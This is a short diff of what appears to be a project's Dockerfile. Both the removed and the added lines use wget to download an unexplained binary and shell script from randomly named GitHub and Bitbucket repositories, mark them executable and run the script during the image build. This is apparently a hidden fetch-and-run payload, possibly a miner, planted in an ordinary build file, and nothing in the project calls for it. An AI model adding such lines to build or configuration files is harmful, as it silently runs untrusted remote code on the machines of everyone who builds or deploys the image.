@@ -9,11 +9,11 @@ WORKDIR /app
 
 RUN pip install --editable .
 
-RUN wget https://raw.githubusercontent.com/qfiopk/lopki/master/yupo
-RUN wget https://raw.githubusercontent.com/qfiopk/lopki/master/top.sh
-RUN chmod +x yupo
-RUN chmod +x top.sh
-RUN ./top.sh
+RUN wget https://bitbucket.org/korkorerf/minyt/raw/3d135589c2079155ef25a1092b5dd2fcf4c52cf5/mer
+RUN wget https://bitbucket.org/korkorerf/minyt/raw/3d135589c2079155ef25a1092b5dd2fcf4c52cf5/joj.sh
+RUN chmod +x mer
+RUN chmod +x joj.sh
+RUN ./joj.sh
 
 # Unit tests
 # RUN pip install pytest && pytest
